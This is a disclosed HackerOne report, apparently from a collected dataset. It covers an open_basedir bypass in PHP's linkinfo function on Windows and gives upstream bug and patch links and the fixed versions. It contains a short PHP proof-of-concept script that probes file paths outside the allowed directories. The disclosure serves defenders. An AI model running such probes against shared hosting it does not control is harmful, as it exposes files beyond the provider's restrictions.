---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '384719'
original_report_id: '384719'
title: linkinfo - openbasedir bypass on Windows PHP
weakness: Improper Access Control - Generic
team_handle: ibb
created_at: '2018-07-20T18:31:03.649Z'
disclosed_at: '2018-10-15T15:29:51.313Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: PHP
asset_type: OTHER
max_severity: none
tags:
- hackerone
- improper-access-control-generic
---

# linkinfo - openbasedir bypass on Windows PHP

## Metadata

- HackerOne Report ID: 384719
- Weakness: Improper Access Control - Generic
- Program: ibb
- Disclosed At: 2018-10-15T15:29:51.313Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Upstream bug - windows linkinfo lacks openbasedir check
===
https://bugs.php.net/bug.php?id=76459 

Summary
==
Description:
------------
linkinfo function on windows doesn't implement openbasedir check, it can be seen by reviewing the source code. This could be abused to find files on paths outside of the allowed directories.


Windows: https://github.com/php/php-src/blob/master/ext/standard/link_win32.c#L88
Unix: https://github.com/php/php-src/blob/master/ext/standard/link.c#L85

Test script:
---------------
<?php

$var1="c:\\jump";
print "checking $var1 ...".PHP_EOL;
print @linkinfo($var1).PHP_EOL;
$var1="c:\\jump\\folder\\file1.txt";
print "checking $var1 ...".PHP_EOL;
print @linkinfo($var1).PHP_EOL;
$var1="c:\\jump\\blabla";
print "checking $var1 ...".PHP_EOL;
print @linkinfo($var1).PHP_EOL;

Expected result:
----------------
Warning: linkinfo(): open_basedir restriction in effect

Patch
==
http://git.php.net/?p=php-src.git;a=commit;h=289cb0f77c28b80a779170711f5e4e92cdd4fbdb

Fixed for PHP 5.6.37, PHP 7.0.31, PHP 7.1.20, PHP 7.2.8
==
http://php.net/ChangeLog-5.php#5.6.37

## Impact

Bypass openbasedir restriction set by hosting provider on a shared environment
 http://php.net/manual/en/ini.core.php#ini.open-basedir

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
